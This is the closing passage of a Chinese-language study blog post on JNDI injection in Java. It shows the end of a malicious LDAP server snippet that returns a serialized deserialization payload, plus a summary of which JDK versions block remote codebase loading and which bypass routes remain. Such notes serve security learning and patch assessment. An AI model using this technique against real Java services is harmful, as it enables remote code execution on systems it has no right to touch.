            e.addAttribute(&#34;javaSerializedData&#34;, serializeObject(getPayload()));  
  
            result.sendSearchEntry(e);  
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));  
        }  
    }  
}  
```  
和低版本`JDK`运行的`Server`端代码差不多，就把`sendResult`处的代码改成能触发反序列化漏洞的利用链就可以。  
## 总结  
- `JDK 5U45`、`6U45`、`7u21`、`8u121` 开始 `java.rmi.server.useCodebaseOnly` 默认配置为`true`  
- `JDK 6u132`、`7u122`、`8u113` 开始 `com.sun.jndi.rmi.object.trustURLCodebase` 默认值为`false`  
- `JDK 11.0.1`、`8u191`、`7u201`、`6u211` 开始 `com.sun.jndi.ldap.object.trustURLCodebase` 默认为`false`  
由于`JNDI`注入动态加载的原理是使用`Reference`使用`Object Factory`类，其内部在上文中也分析到了使用的是`URLClassLoader`，所以不受`java.rmi.server.useCodebaseOnly=false`属性的限制。但是不可避免受到`com.sun.jndi.rmi.object.trustURLCodebase`、`com.sun.jndi.cosnaming.object.trustURLCodebase`的限制。  
`JNDI-RMI`的注入方式有`codebase`(JDK6u132、7u122、8u113之前可以)  
利用本地`Class Factory`作为`Reference Factory`  
`JNDI-LDAP`注入方式`codebase`(JDK 11.0.1、8u191、7u201、6u211之前可以)  
利用`serialize`  
## Reference  
https://tttang.com/archive/1611/  
https://paper.seebug.org/1091/  

---

> Author: N1Rvana  
> URL: http://localhost:1313/jndi%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%951/  

